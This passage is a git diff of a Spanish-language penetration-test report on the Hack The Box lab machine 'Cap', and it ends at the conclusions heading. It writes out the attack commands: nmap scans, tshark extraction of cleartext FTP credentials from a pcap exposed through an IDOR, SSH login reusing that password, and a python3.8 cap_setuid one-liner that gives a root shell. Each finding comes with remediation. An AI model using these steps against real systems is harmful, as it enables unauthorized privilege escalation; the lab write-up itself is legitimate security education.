@@ -1,167 +1,210 @@
 ---
-title: Cap
+report_id: HO-0007-00
+target: Cap
+platform: Hack The Box
 os: Linux
-dificultad: Easy
+difficulty: Easy
 ip: 10.129.85.254
-fecha: 2026-10-19
-categoria: Machine
-estado: completado
-tags: [htb, linux, ftp, idor, linux-capabilities, python, information-disclosure]
+date: 2026-10-19
+version: 1.0
+author: Francisco Nieto
+status: Final
+tags: [htb, linux, easy, ftp, idor, linux-capabilities, information-disclosure]
 ---
 
-# Cap — Informe de Pentest
+# Informe de Prueba de Penetración — Cap
 
-> Writeup de la máquina **Cap** de [Hack The Box](https://www.hackthebox.com/). Documento con fines educativos, realizado en un entorno de laboratorio autorizado.
+| | |
+|---|---|
+| **ID de informe** | HO-0007-00 |
+| **Objetivo** | Cap (`10.129.85.254`) |
+| **Plataforma** | Hack The Box — máquina retirada |
+| **Tipo de prueba** | Caja negra (black box) |
+| **Fecha de ejecución** | 2026-10-19 |
+| **Autor** | Francisco Nieto — [@NiettoFrann](https://github.com/NiettoFrann) |
+| **Versión** | 1.0 |
+| **Clasificación** | Público — uso educativo |
 
-## Información general
+> **Aviso legal.** Las pruebas se realizaron sobre un entorno de laboratorio autorizado
+> (Hack The Box) y sobre una máquina retirada. Ninguna técnica descrita debe aplicarse
+> sobre sistemas sin autorización expresa por escrito de su propietario.
 
-| Campo                  | Detalle         |
-| ---------------------- | --------------- |
-| **Máquina**            | Cap     |
-| **Sistema operativo**  | Linux          |
-| **Dificultad**         | Easy  |
-| **Categoría**          | Machine    |
-| **Dirección IP**       | `10.129.85.254`        |
-| **Fecha de resolución**| 2026-10-19        |
-| **Autor del informe**  | NiettoFrann      |
-| **Estado**             | Completado     |
+### Control de versiones
+
+| Versión | Fecha | Descripción |
+|---------|-------|-------------|
+| 1.0 | 2026-10-19 | Versión inicial |
+
+---
 
 ## Índice
 
-1. [Resumen ejecutivo](#resumen-ejecutivo)
-2. [Hallazgos de un vistazo](#hallazgos-de-un-vistazo)
-3. [Alcance y metodología](#alcance-y-metodología)
-4. [Cadena de ataque](#cadena-de-ataque)
-5. [Reconocimiento](#reconocimiento)
-6. [Enumeración](#enumeración)
-7. [Explotación (Foothold)](#explotación-foothold)
-8. [Escalada de privilegios](#escalada-de-privilegios)
-9. [Flags](#flags)
-10. [Detalle de hallazgos](#detalle-de-hallazgos)
-11. [Plan de remediación priorizado](#plan-de-remediación-priorizado)
-12. [Lecciones aprendidas](#lecciones-aprendidas)
-13. [Herramientas utilizadas](#herramientas-utilizadas)
-14. [Evidencia](#evidencia)
-15. [Referencias](#referencias)
+1. [Resumen ejecutivo](#1-resumen-ejecutivo)
+2. [Alcance y metodología](#2-alcance-y-metodología)
+3. [Narrativa del ataque](#3-narrativa-del-ataque)
+4. [Hallazgos técnicos](#4-hallazgos-técnicos)
+5. [Post-explotación](#5-post-explotación)
+6. [Conclusiones](#6-conclusiones)
+7. [Anexos](#7-anexos)
 
 ---
 
-## Resumen ejecutivo
+## 1. Resumen ejecutivo
 
-Se evaluó un servidor Linux expuesto en la red del laboratorio, con los permisos del cliente y sin credenciales previas. El panel web de administración, pensado para visualizar el estado de la red, permitió a cualquier visitante descargar una captura de tráfico histórica sin autenticarse ni confirmar que le pertenecía. Esa captura contenía, en texto plano, el usuario y la contraseña de una cuenta del sistema.
+### 1.1 Objetivo
 
-Con esas credenciales se obtuvo acceso de archivos primero y, al comprobar que la misma contraseña también abría una sesión remota interactiva, acceso completo a la línea de comandos del servidor. Una vez dentro, un permiso excesivo asignado a un intérprete de Python permitió ejecutar comandos con los privilegios más altos del sistema, dando control total sobre el servidor.
+Evaluar la seguridad del host **Cap** simulando un atacante externo sin credenciales ni
+conocimiento previo del entorno, con el fin de obtener el máximo nivel de privilegios
+posible.
 
-Ninguno de los dos pasos requirió conocimientos avanzados: el primero consiste en cambiar un número en una dirección web, y el segundo en ejecutar un comando de una sola línea ya documentado públicamente. Esto significa que cualquier persona con acceso de red al panel puede, en minutos, llegar a controlar por completo el servidor y todo lo que procese.
+### 1.2 Resultado
 
-Se recomienda, en un plazo inmediato, retirar del panel la posibilidad de descargar capturas de otras sesiones, eliminar credenciales en texto plano de cualquier tráfico accesible y retirar el permiso elevado del intérprete de Python no utilizado con ese fin.
+> Se obtuvo control total del servidor. Un panel de administración sin contraseña
+> permitió descargar una grabación de tráfico de red que no debía ser pública y que
+> contenía, en texto claro, el usuario y la contraseña de una cuenta real del sistema. Esa
+> misma contraseña abría también una sesión remota completa, y una vez dentro, un permiso
+> mal configurado en el intérprete de Python permitió convertirse en administrador del
+> servidor. Un atacante real podría robar, modificar o destruir toda la información
+> alojada en el equipo.
 
-**Riesgo global: Crítico.**
+**Nivel de riesgo global:** `CRÍTICO`
 
-| Severidad | Cantidad |
-| --- | --- |
-| Crítica | 1 |
-| Alta | 1 |
-| Media | 1 |
+### 1.3 Distribución de hallazgos
 
-## Hallazgos de un vistazo
+| Crítica | Alta | Media | Baja | Informativa |
+|:-------:|:----:|:-----:|:----:|:-----------:|
+| 1 | 1 | 1 | 0 | 0 |
 
-| ID | Hallazgo | Severidad | CVSS | Estado |
-| --- | --- | --- | --- | --- |
-| H-02 | Descarga no autorizada de capturas de red ajenas (IDOR) con exposición de credenciales en texto plano | Crítica | 9.1 | Explotado |
-| H-03 | Permiso Linux excesivo (`cap_setuid`) en el intérprete Python 3.8 | Alta | 7.8 | Explotado |
-| H-01 | Panel de administración de red accesible sin autenticación | Media | 5.3 | Explotado |
+### 1.4 Resumen de hallazgos
 
-> H-01 y H-02 están relacionados: H-01 es la puerta de entrada al panel; H-02 es la debilidad concreta que filtró las credenciales. Se documentan por separado porque cada uno tiene una corrección independiente (ver [Plan de remediación](#plan-de-remediación-priorizado)).
+| ID | Hallazgo | Severidad | CVSS |
+|----|----------|-----------|------|
+| [HO-0007-02](#ho-0007-02--descarga-no-autorizada-de-capturas-de-red-ajenas-idor-con-exposición-de-credenciales-en-texto-plano) | Descarga no autorizada de capturas de red ajenas (IDOR) con exposición de credenciales | Crítica | 9.1 |
+| [HO-0007-03](#ho-0007-03--permiso-linux-excesivo-cap_setuid-en-el-intérprete-python-38) | Permiso Linux excesivo (`cap_setuid`) en el intérprete Python 3.8 | Alta | 7.8 |
+| [HO-0007-01](#ho-0007-01--panel-de-administración-de-red-accesible-sin-autenticación) | Panel de administración de red accesible sin autenticación | Media | 5.3 |
 
-## Alcance y metodología
+> HO-0007-01 y HO-0007-02 están relacionados: el primero es la puerta de entrada al panel
+> y el segundo es la debilidad concreta que filtró las credenciales. Se documentan por
+> separado porque cada uno tiene una corrección independiente.
 
-- **Objetivo:** `10.129.85.254` (Cap)
-- **Tipo de prueba:** caja negra, sin credenciales previas.
-- **Metodología:** Reconocimiento → Enumeración → Explotación → Post-explotación / Escalada de privilegios → Documentación.
-- **Entorno:** conexión a la VPN de HTB desde Linux. Prueba realizada en entorno de laboratorio autorizado; no se realizaron acciones de denegación de servicio ni destrucción de datos.
+### 1.5 Recomendaciones prioritarias
 
-## Cadena de ataque
+1. Restringir o eliminar el acceso a capturas históricas del panel y purgar cualquier credencial expuesta en ellas.
+2. Retirar la capability `cap_setuid` de `/usr/bin/python3.8`.
+3. Exigir autenticación en todo el panel "Security Dashboard" y evitar la reutilización de contraseñas entre servicios.
 
-```text
-Reconocimiento (nmap: 21/ftp, 22/ssh, 80/http)
-  -> [H-01] Panel "Security Dashboard" accesible sin autenticación
-  -> [H-02] IDOR en "Security Snapshot" (parámetro ID): la captura ID=0 expone credenciales FTP en texto plano
-  -> Foothold: login FTP como nathan -> user.txt
-  -> Reutilización de la misma contraseña en SSH -> shell interactiva
-  -> [H-03] Capability cap_setuid en /usr/bin/python3.8
-  -> Root -> root.txt
+---
+
+## 2. Alcance y metodología
+
+### 2.1 Alcance
+
+| Activo | Dirección | Incluido |
+|--------|-----------|:--------:|
+| Cap | `10.129.85.254` | Sí |
+
+**Fuera de alcance:** ataques de denegación de servicio, infraestructura de la
+plataforma y otros jugadores.
+
+### 2.2 Metodología
+
+La prueba siguió las fases del estándar **PTES** (Penetration Testing Execution
+Standard), apoyándose en **OWASP WSTG** para los componentes web:
+
+1. **Reconocimiento** — descubrimiento de puertos y servicios.
+2. **Enumeración** — identificación de versiones, tecnologías y superficie de ataque.
+3. **Análisis de vulnerabilidades** — validación manual de posibles fallos.
+4. **Explotación** — obtención de acceso inicial.
+5. **Post-explotación** — escalada de privilegios y movimiento lateral.
+6. **Reporte** — documentación de hallazgos y recomendaciones.
+
+### 2.3 Entorno del auditor
+
+| Componente | Detalle |
+|------------|---------|
+| Sistema | Linux (kernel 7.2.11-zen1-1-zen) |
+| Conexión | VPN de Hack The Box |
+| Herramientas | nmap 7.992, navegador web, Wireshark/tshark, ftp, ssh, getcap, python3.8 |
+
+### 2.4 Clasificación de severidad
+
+Las vulnerabilidades se puntúan con **CVSS v3.1** (ver tabla de criterios estándar).
+
+---
+
+## 3. Narrativa del ataque
+
+### 3.1 Cadena de compromiso
+
+```mermaid
+flowchart LR
+    A["Reconocimiento<br/>21/22/80"] --> B["HO-0007-01<br/>Panel sin auth"]
+    B --> C["HO-0007-02<br/>IDOR en captura ID=0"]
+    C --> D["Credenciales FTP<br/>en texto plano"]
+    D --> E["FTP: user.txt"]
+    D --> F["SSH: shell nathan"]
+    F --> G["HO-0007-03<br/>cap_setuid en python3.8"]
+    G --> H["root / root.txt"]
 ```
 
----
-
-## Reconocimiento
-
-### Escaneo de puertos
+### 3.2 Reconocimiento
 
 ```bash
 nmap -p- --min-rate=5000 -T4 -Pn -n -oN loot/puertos.txt 10.129.85.254
-nmap -p21,22,80 -sCV -Pn -n -T4 -oN detallado.txt 10.129.85.254
+nmap -p21,22,80 -sCV -Pn -n -T4 -oN loot/detallado.txt 10.129.85.254
 ```
 
-| Puerto | Estado | Servicio | Versión |
-| ------ | ------ | -------- | ------- |
-| 21/tcp | open | ftp | vsftpd 3.0.3 |
-| 22/tcp | open | ssh | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 |
-| 80/tcp | open | http | Gunicorn — "Security Dashboard" |
+| Puerto | Servicio | Versión | Observaciones |
+|--------|----------|---------|---------------|
+| 21/tcp | FTP | vsftpd 3.0.3 | Sin acceso anónimo; CVE conocido de DoS descartado por estar fuera de alcance. |
+| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 | Vector de acceso tras obtener credenciales. |
+| 80/tcp | HTTP | Gunicorn — "Security Dashboard" | Principal superficie de ataque. |
 
-El escaneo completo de puertos (`-p-`) confirma que solo tres servicios están expuestos. El escaneo dirigido con detección de versión (`-sCV`) identifica `vsftpd 3.0.3` en FTP, `OpenSSH 8.2p1` sobre Ubuntu en SSH, y un servidor web **Gunicorn** (backend típico de aplicaciones Python/Flask) cuyo título de página es "Security Dashboard".
+> Salida completa en el [Anexo A](#a-salida-completa-de-escaneos).
 
-> Evidencia: [`loot/puertos.txt`](loot/puertos.txt), [`loot/detallado.txt`](loot/detallado.txt)
+### 3.3 Enumeración
 
-## Enumeración
+El sitio en el puerto 80 es un panel de monitoreo de red ("Security Dashboard") sin
+ningún mecanismo de autenticación: se accede directamente sin usuario ni contraseña
+(**HO-0007-01**).
 
-### FTP (puerto 21)
+La función "Security Snapshot (5 Second PCAP + Analysis)" (`/data/<ID>`) dispara una
+captura de tráfico de 5 segundos y la pone a disposición para descarga. Cada captura se
+referencia con un número en la URL. Los valores de `ID` distintos de `0` regeneran una
+captura en vivo en cada consulta (pocos paquetes); el valor `0` no cambia entre consultas:
+siempre devuelve el mismo archivo histórico de 72 paquetes, accesible para cualquier
+visitante sin verificar a quién pertenece (**HO-0007-02**, IDOR).
 
-Se probó acceso anónimo contra el servicio FTP; no fue aceptado. Se investigó además la versión `vsftpd 3.0.3` en busca de vulnerabilidades conocidas: la única asociada es una condición de denegación de servicio, descartada por estar fuera del alcance de la prueba (no se ejecutan ataques de disponibilidad).
+![Figura 1 — Dashboard con captura en vivo (ID distinto de 0)](../../../assets/images/screenshots/00-cap/01-dashboard.png)
+*Figura 1 — Panel "Security Dashboard" mostrando una captura regenerada.*
 
-### HTTP (puerto 80) — Security Dashboard
+![Figura 2 — Captura histórica fija (ID=0)](../../../assets/images/screenshots/00-cap/02-captura-historica.png)
+*Figura 2 — El `ID=0` siempre devuelve el mismo archivo almacenado.*
 
-El sitio alojado en el puerto 80 es un panel de monitoreo de red (**Security Dashboard**) **sin ningún mecanismo de autenticación**: se accede directamente desde el navegador sin usuario ni contraseña (**H-01**).
-
-Dentro del panel, la función **"Security Snapshot (5 Second PCAP + Analysis)"** (`/data/<ID>`) permite disparar una captura de tráfico de 5 segundos y descargarla. Cada captura se referencia mediante un identificador numérico (`ID`) en la URL. Al recorrer manualmente los valores de `ID` se observó:
-
-- Los IDs distintos de `0` (por ejemplo `/data/1`) regeneran una captura nueva en cada consulta: tráfico en vivo al momento de pedirla, con muy pocos paquetes (7 en el ejemplo).
-
-  ![Dashboard — captura en vivo (ID distinto de 0)](../../../assets/images/screenshots/00-cap/01-dashboard.png)
-
-- El ID `0` (`/data/0`) **no cambia entre consultas**: siempre devuelve el mismo archivo de 72 paquetes, es decir, una captura histórica almacenada y accesible para cualquier visitante del panel, sin que nadie verifique a quién pertenece (**H-02**, IDOR — Insecure Direct Object Reference).
-
-  ![Dashboard — captura histórica fija (ID=0)](../../../assets/images/screenshots/00-cap/02-captura-historica.png)
-
-Se descargó la captura correspondiente al `ID 0` y se analizó con Wireshark/`tshark`, filtrando por `tcp.port == 21` (tráfico FTP):
+Se descargó la captura del `ID 0` y se analizó filtrando tráfico FTP:
 
 ```bash
 tshark -r 0.pcap -Y "tcp.port==21" -T fields \
   -e ip.src -e ip.dst -e ftp.request.command -e ftp.request.arg -e ftp.response.arg
 ```
 
-**Resultado:** la captura (72 paquetes, 2021-05-14, 31 segundos de duración) registra una sesión FTP completa en texto plano, incluyendo el login:
+La captura (72 paquetes, duración 31 s) registra una sesión FTP completa en texto plano,
+incluido el login:
 
-```
+```text
 USER  nathan
 PASS  Buck3tH4TF0RM3!
 Login successful.
 ```
 
-**Decisión:** las credenciales `nathan:Buck3tH4TF0RM3!` quedaron expuestas por un fallo de control de acceso en el panel web, no por un ataque a FTP en sí. Se usan a continuación para autenticarse contra los servicios reales de la máquina.
+Las credenciales `nathan:Buck3tH4TF0RM3!` quedaron expuestas por el fallo de control de
+acceso del panel, no por un ataque directo a FTP.
 
 > Evidencia: [`loot/0.pcap`](loot/0.pcap), [`loot/credentials_wireshark.txt`](loot/credentials_wireshark.txt)
 
-## Explotación (Foothold)
+### 3.4 Acceso inicial
 
-- **Vulnerabilidad:** H-02 — IDOR en el endpoint de descarga de capturas PCAP, que expone credenciales de FTP en texto plano a cualquier visitante no autenticado del panel.
-- **Referencia (CVE / técnica):** CWE-639 (Authorization Bypass Through User-Controlled Key) + CWE-312 (Cleartext Storage of Sensitive Information). No aplica CVE: es un error de diseño de la aplicación, no una vulnerabilidad de un producto de terceros.
-- **Impacto:** acceso autenticado al sistema como el usuario `nathan`.
-
-### Procedimiento
-
-Con las credenciales obtenidas del pcap, se accedió primero por FTP y se recuperó la flag de usuario:
+Con las credenciales obtenidas se accedió por FTP y se recuperó `user.txt`:
 
 ```bash
 ftp 10.129.85.254
@@ -171,45 +214,144 @@ ftp> ls
 ftp> get user.txt
 ```
 
-```
-230 Login successful.
-ftp> ls
--r--------    1 1001     1001           33 Oct 19 19:00 user.txt
-ftp> get user.txt
-226 Transfer complete.
-```
+![Figura 3 — Login FTP como nathan y descarga de user.txt](../../../assets/images/screenshots/00-cap/03-acceso-ftp.png)
+*Figura 3 — Acceso FTP y recuperación de la flag de usuario.*
 
-![FTP — login como nathan y descarga de user.txt](../../../assets/images/screenshots/00-cap/03-acceso-ftp.png)
-
-> Evidencia: [`loot/user.txt`](loot/user.txt)
-
-Se probó además la reutilización de la misma contraseña contra el servicio SSH (puerto 22), con resultado positivo: el usuario `nathan` reutiliza la contraseña de FTP para su cuenta del sistema (**H-02**, agravado por una mala práctica de gestión de credenciales).
+Se probó la reutilización de la misma contraseña en SSH, con resultado positivo:
 
 ```bash
 ssh nathan@10.129.85.254
 # Password: Buck3tH4TF0RM3!
 ```
 
+Esto otorgó una shell interactiva completa (TTY estable), por lo que no fue necesaria
+ninguna estabilización adicional.
+
+![Figura 4 — Shell interactiva vía SSH como nathan](../../../assets/images/screenshots/00-cap/04-acceso-ssh.png)
+*Figura 4 — Acceso SSH con la contraseña reutilizada de FTP.*
+
+### 3.5 Movimiento lateral
+
+No aplica: el mismo usuario (`nathan`) obtenido por FTP se reutilizó directamente en SSH.
+
+### 3.6 Escalada de privilegios
+
+Ver **[HO-0007-03](#ho-0007-03--permiso-linux-excesivo-cap_setuid-en-el-intérprete-python-38)**.
+
+---
+
+## 4. Hallazgos técnicos
+
+### HO-0007-01 — Panel de administración de red accesible sin autenticación
+
+| | |
+|---|---|
+| **Severidad** | Media |
+| **CVSS v3.1** | 5.3 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |
+| **CWE** | [CWE-306](https://cwe.mitre.org/data/definitions/306.html) — Missing Authentication for Critical Function |
+| **CVE** | — |
+| **Componente afectado** | Aplicación web "Security Dashboard" — Gunicorn, `10.129.85.254:80` |
+| **Estado** | Explotada |
+
+#### Descripción
+
+El panel web de monitoreo de red es accesible sin usuario ni contraseña desde cualquier
+punto con conectividad al puerto 80. La causa raíz es la ausencia total de control de
+acceso en la aplicación.
+
+#### Prueba de concepto
+
+Acceso directo a `http://10.129.85.254/` sin credenciales (ver Figura 1).
+
+#### Impacto
+
+Cualquier visitante puede ver el estado de la red y disparar o consultar capturas de
+tráfico. Por sí solo expone información operativa de bajo riesgo, pero es la puerta de
+entrada que habilita HO-0007-02.
+
+#### Remediación
+
+- **Corto plazo:** restringir el acceso al puerto 80 por IP/VPN mientras se implementa autenticación.
+- **Largo plazo:** exigir usuario y contraseña para cualquier funcionalidad del panel, incluida la consulta y descarga de capturas.
+
+#### Referencias
+
+- [CWE-306 — Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
+
+---
+
+### HO-0007-02 — Descarga no autorizada de capturas de red ajenas (IDOR) con exposición de credenciales en texto plano
+
+| | |
+|---|---|
+| **Severidad** | Crítica |
+| **CVSS v3.1** | 9.1 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
+| **CWE** | [CWE-639](https://cwe.mitre.org/data/definitions/639.html) — Authorization Bypass Through User-Controlled Key (IDOR), junto a [CWE-312](https://cwe.mitre.org/data/definitions/312.html) — Cleartext Storage of Sensitive Information |
+| **CVE** | — |
+| **Componente afectado** | Endpoint "Security Snapshot" (parámetro `ID`) — `10.129.85.254:80` |
+| **Estado** | Explotada |
+
+#### Descripción
+
+El endpoint que sirve capturas de tráfico identifica cada una por un número secuencial en
+la URL, sin verificar que quien la pide tenga derecho a verla. La captura con `ID=0` es
+una grabación histórica fija que contiene una sesión FTP completa en texto plano,
+incluidas sus credenciales.
+
+#### Prueba de concepto
+
+**Paso 1.** Descubrir que `/data/0` devuelve siempre el mismo archivo (72 paquetes), a
+diferencia de otros IDs que regeneran tráfico en vivo.
+
+**Paso 2.** Descargar y analizar la captura filtrando por el puerto FTP.
+
+```bash
+tshark -r 0.pcap -Y "tcp.port==21" -T fields \
+  -e ip.src -e ip.dst -e ftp.request.command -e ftp.request.arg -e ftp.response.arg
 ```
-nathan@cap:~$ id
-uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
-```
 
-Esto otorgó una shell interactiva completa, en lugar del acceso limitado a archivos que ofrece FTP.
+**Paso 3.** Extraer las credenciales expuestas: `nathan:Buck3tH4TF0RM3!`.
 
-![SSH — shell interactiva como nathan](../../../assets/images/screenshots/00-cap/04-acceso-ssh.png)
+#### Impacto
 
-### Estabilización de la shell
+Cualquier visitante sin autenticar puede recuperar usuario y contraseña válidos del
+sistema simplemente cambiando un número en la URL. Esas credenciales resultaron además
+reutilizadas en SSH, lo que las convirtió en acceso interactivo completo al servidor.
 
-No fue necesaria: el acceso se obtuvo directamente por SSH, que ya entrega una shell interactiva y estable (TTY completo), a diferencia de una reverse shell típica de una explotación remota.
+#### Remediación
 
-## Escalada de privilegios
+- **Corto plazo:** deshabilitar la descarga de capturas antiguas hasta implementar control de acceso; eliminar o depurar cualquier captura histórica que contenga credenciales reales.
+- **Largo plazo:** no referenciar objetos por un ID secuencial predecible — usar identificadores aleatorios (UUID) y validar permisos del solicitante; forzar el uso de FTP sobre un canal cifrado para que una captura no exponga contraseñas en texto plano.
 
-- **Vector:** H-03 — permiso (*capability*) de Linux `cap_setuid` asignado al binario `/usr/bin/python3.8`, que permite a ese intérprete asumir el UID 0 sin necesidad de `sudo`.
-- **Referencia (CVE / técnica / GTFOBins):** [GTFOBins — python (capabilities)](https://gtfobins.github.io/gtfobins/python/#capabilities). CWE-250 (Execution with Unnecessary Privileges).
-- **Impacto:** ejecución de comandos arbitrarios como `root`, control total del sistema.
+#### Referencias
 
-### Enumeración local
+- [CWE-639 — Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
+- [CWE-312 — Cleartext Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/312.html)
+- [OWASP — Insecure Direct Object References](https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference)
+
+---
+
+### HO-0007-03 — Permiso Linux excesivo (`cap_setuid`) en el intérprete Python 3.8
+
+| | |
+|---|---|
+| **Severidad** | Alta |
+| **CVSS v3.1** | 7.8 — `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
+| **CWE** | [CWE-250](https://cwe.mitre.org/data/definitions/250.html) — Execution with Unnecessary Privileges |
+| **CVE** | — |
+| **Componente afectado** | `/usr/bin/python3.8` (Linux capabilities) |
+| **Estado** | Explotada |
+
+#### Descripción
+
+El binario `/usr/bin/python3.8` tiene asignada la capability `cap_setuid=ep`, que le
+permite cambiar su propio UID a `0` sin pasar por `sudo` ni por ningún control adicional.
+La enumeración de `sudo -l` y de binarios SUID no reveló ningún vector; la enumeración de
+capabilities sí.
+
+#### Prueba de concepto
+
+**Paso 1.** Enumeración local de permisos.
 
 ```bash
 id; sudo -l
@@ -217,169 +359,157 @@ find / -perm -4000 -type f 2>/dev/null
 getcap -r / 2>/dev/null
 ```
 
-La enumeración de `sudo -l` y de binarios con bit SUID no reveló ningún vector de escalada. La enumeración de **capabilities** (`getcap -r /`) sí:
-
-```
-nathan@cap:~$ getcap -r / 2>/dev/null
+```text
 /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
-/usr/bin/ping = cap_net_raw+ep
-/usr/bin/traceroute6.iputils = cap_net_raw+ep
-/usr/bin/mtr-packet = cap_net_raw+ep
-/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
 ```
 
-`/usr/bin/python3.8` tiene asignada `cap_setuid+ep`, un permiso que normalmente solo deberían tener binarios que necesitan cambiar de usuario de forma controlada (como `ping` o servicios de sistema), no un intérprete de propósito general.
-
-### Procedimiento
-
-Siguiendo la técnica documentada en GTFOBins para binarios con `cap_setuid`, se usó Python para asumir el UID 0 y lanzar una shell con privilegios de `root`:
+**Paso 2.** Explotación siguiendo la técnica documentada en GTFOBins para binarios con
+`cap_setuid`.
 
 ```bash
 python3.8 -c 'import os; os.setuid(0); os.execl("/bin/bash", "sh")'
 ```
 
-```
+```text
 sh-5.0# id
 uid=0(root) gid=1001(nathan) groups=1001(nathan)
-sh-5.0# bash
-root@cap:~# cat /root/root.txt
-24060fc87747fad93134cdca35175e32
 ```
 
-![Escalada — capabilities y explotación con python3.8](../../../assets/images/screenshots/00-cap/05-capabilite-y-explotacion.png)
+![Figura 5 — Enumeración de capabilities y escalada con python3.8](../../../assets/images/screenshots/00-cap/05-capabilite-y-explotacion.png)
+*Figura 5 — Explotación de `cap_setuid` para obtener una shell de root.*
 
-> Evidencia: [`loot/root.txt`](loot/root.txt)
+#### Impacto
 
----
+Un usuario local sin privilegios ejecuta una línea de Python para asumir UID 0 y obtener
+una shell de `root`, logrando control total del sistema (lectura, modificación y
+persistencia sobre cualquier archivo o servicio).
 
-## Flags
+#### Remediación
 
-| Flag     | Valor                 |
-| -------- | --------------------- |
-| `user.txt` | `c15e0440349e3f5d5c574fee72ad97d8` |
-| `root.txt` | `24060fc87747fad93134cdca35175e32` |
+- **Corto plazo:** retirar la capability (`setcap -r cap_setuid+ep /usr/bin/python3.8`) si no es un requisito funcional real.
+- **Largo plazo:** si se necesitara ese privilegio, sustituir por un binario dedicado y mínimo en lugar de un intérprete de propósito general; auditar periódicamente `getcap -r /` contra una lista aprobada.
 
-## Detalle de hallazgos
+#### Referencias
 
-### H-01 — Panel de administración de red accesible sin autenticación
-
-| Campo | Detalle |
-| --- | --- |
-| **Severidad** | Media |
-| **CVSS v3.1** | 5.3 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |
-| **CWE** | [CWE-306 – Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html) |
-| **CVE** | N/A (error de configuración de la aplicación) |
-| **Componente** | Aplicación web "Security Dashboard" — Gunicorn, 80/tcp |
-| **Estado** | Explotado y confirmado |
-
-**Descripción.** El panel web de monitoreo de red es accesible sin usuario ni contraseña desde cualquier punto con conectividad al puerto 80.
-
-**Impacto.** Confirmado: cualquier visitante puede ver el estado de la red y disparar/consultar capturas de tráfico. Por sí solo expone información operativa de bajo riesgo, pero es la puerta de entrada que habilita H-02.
-
-**Evidencia.** Acceso directo a `http://10.129.85.254/` sin credenciales.
-
-**Remediación.**
-- *Corrección:* exigir autenticación (usuario/contraseña) para acceder a cualquier funcionalidad del panel, incluida la consulta y descarga de capturas.
-- *Mitigación:* restringir el acceso al puerto 80 por IP/VPN mientras se implementa autenticación.
-- *Detección:* registrar y alertar sobre accesos al panel desde orígenes no esperados.
-
-**Referencias.** CWE-306.
+- [CWE-250 — Execution with Unnecessary Privileges](https://cwe.mitre.org/data/definitions/250.html)
+- [GTFOBins — python (capabilities)](https://gtfobins.github.io/gtfobins/python/#capabilities)
 
 ---
 
-### H-02 — Descarga no autorizada de capturas de red ajenas (IDOR) con exposición de credenciales en texto plano
+## 5. Post-explotación
 
-| Campo | Detalle |
-| --- | --- |
-| **Severidad** | Crítica |
-| **CVSS v3.1** | 9.1 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
-| **CWE** | [CWE-639 – Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html) (IDOR) junto a [CWE-312 – Cleartext Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/312.html) |
-| **CVE** | N/A (error de diseño de la aplicación) |
-| **Componente** | Endpoint "Security Snapshot" (parámetro `ID`) — 80/tcp |
-| **Estado** | Explotado y confirmado |
+### 5.1 Acceso obtenido
 
-**Descripción.** El endpoint que sirve capturas de tráfico identifica cada captura por un número secuencial en la URL, sin verificar que quien la pide tenga derecho a verla. La captura con `ID=0` es una grabación histórica fija (no regenerada en cada consulta) que contiene una sesión FTP completa en texto plano, incluidas sus credenciales.
+| Nivel | Usuario | Método | Prueba |
+|-------|---------|--------|--------|
+| Usuario | `nathan` | HO-0007-02 | `user.txt` — `c15e0440************************` |
+| Administrador | `root` | HO-0007-03 | `root.txt` — `24060fc8************************` |
 
-**Impacto.** Confirmado: cualquier visitante sin autenticar puede recuperar usuario y contraseña válidos del sistema (`nathan:Buck3tH4TF0RM3!`) simplemente cambiando un número en la URL. Esas credenciales resultaron además reutilizadas en SSH, lo que las convirtió en acceso interactivo completo al servidor.
+### 5.2 Información sensible expuesta
 
-**Evidencia.** [`loot/0.pcap`](loot/0.pcap) (filtrado por `tcp.port==21`), [`loot/credentials_wireshark.txt`](loot/credentials_wireshark.txt).
+| Tipo | Ubicación | Observación |
+|------|-----------|-------------|
+| Credenciales FTP en texto plano | Captura histórica `ID=0` del panel web | Reutilizadas también en SSH. |
 
-**Remediación.**
-- *Corrección:* no referenciar objetos por un ID secuencial predecible; usar identificadores aleatorios (UUID) y validar que el solicitante tenga permiso sobre ese recurso. Eliminar o depurar cualquier captura histórica que contenga credenciales reales.
-- *Mitigación:* deshabilitar temporalmente la descarga de capturas antiguas hasta implementar control de acceso; forzar el uso de FTP/credenciales sobre un canal cifrado para que una captura no exponga contraseñas en texto plano.
-- *Detección:* alertar sobre descargas repetidas o secuenciales de IDs de captura desde un mismo origen.
+> Las credenciales y flags se muestran parcialmente censuradas.
 
-**Referencias.** CWE-639, CWE-312, [OWASP – Insecure Direct Object References](https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference).
+### 5.3 Limpieza
+
+| Artefacto | Ubicación | Estado |
+|-----------|-----------|--------|
+| — | — | No se cargaron archivos ni herramientas en el objetivo. |
 
 ---
 
-### H-03 — Permiso Linux excesivo (`cap_setuid`) en el intérprete Python 3.8
+## 6. Conclusiones
 
-| Campo | Detalle |
-| --- | --- |
-| **Severidad** | Alta |
-| **CVSS v3.1** | 7.8 — `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
-| **CWE** | [CWE-250 – Execution with Unnecessary Privileges](https://cwe.mitre.org/data/definitions/250.html) |
-| **CVE** | N/A (error de configuración del sistema) |
-| **Componente** | `/usr/bin/python3.8` (Linux capabilities) |
-| **Estado** | Explotado y confirmado |
+### 6.1 Conclusión técnica
 
